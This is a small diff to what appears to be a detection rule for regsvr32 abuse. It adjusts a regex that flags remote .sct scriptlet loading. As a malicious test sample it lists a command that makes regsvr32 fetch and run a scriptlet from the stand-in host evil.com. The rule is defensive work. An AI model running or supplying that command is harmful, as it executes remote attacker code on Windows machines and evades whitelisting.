@@ -5,7 +5,7 @@ description: >
   Detects various flag combinations, URL protocols (HTTP/HTTPS/FTP), and .sct file extensions.
 
 pattern: |
-  (?i)regsvr32.*(https?://|ftp://.*\.sct|scrobj\.dll.*https?://|\.sct)
+  (?i)(regsvr32.*(https?://|ftp://.*\.sct|scrobj\.dll.*https?://|\.sct))
 
 malicious:
   - "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
